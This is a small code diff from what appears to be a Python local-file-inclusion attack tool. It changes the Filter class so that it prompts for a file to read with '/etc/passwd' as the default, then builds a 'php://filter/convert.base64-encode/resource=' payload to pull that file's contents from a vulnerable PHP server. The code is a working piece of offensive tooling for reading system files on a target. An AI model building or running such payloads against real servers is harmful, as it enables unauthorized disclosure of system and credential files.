@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from .utils import attack, colors, cook
+from .utils import attack, colors, cook, prompt_input
 
 from .Detection import Detection
 
@@ -30,7 +30,7 @@ class Filter:
 
         """ Build payload """
 
-        f_file = input(colors("[?] Please Enter File To Read: ", 94))
+        f_file = prompt_input(colors("[?] Please Enter File To Read: ", 94), "/etc/passwd")
         payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
 
         if self.cookies:
